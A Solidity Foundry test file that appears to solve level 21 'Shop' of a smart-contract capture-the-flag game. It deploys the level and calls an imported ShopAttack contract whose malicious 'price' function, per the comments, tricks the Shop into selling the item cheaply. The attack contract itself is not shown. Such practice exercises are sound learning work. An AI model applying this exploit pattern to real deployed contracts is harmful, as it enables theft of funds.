// SPDX-License-Identifier: Unlicense
pragma solidity >=0.8.0;
pragma experimental ABIEncoderV2;

import "lib/forge-std/src/BaseTest.sol";
import {ShopFactory, Shop} from "src/levels/21-Shop/ShopFactory.sol";
import {ShopAttack} from "src/levels/21-Shop/ShopAttack.sol";

contract TestShop is BaseTest {
    Shop private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ShopFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(
            this.createLevelInstance{value: 0.001 ether}(true)
        );
        level = Shop(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.isSold(), false);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        // 1. Attacker creates the malicious contract that implemets `price` function of the `Buyer` interface.
        ShopAttack shopAttack = new ShopAttack(address(level));

        emit log_named_uint("Price of item before attack", level.price());

        // 2. Attacker calls the `attack` function that calls `buy` function from `Shop` contract.
        emit log_string("Starting the exploit...");
        shopAttack.attack();

        emit log_named_uint("Price of item after attack", level.price());

        // Test assertion
        assertEq(level.isSold(), true);

        vm.stopPrank();
    }
}
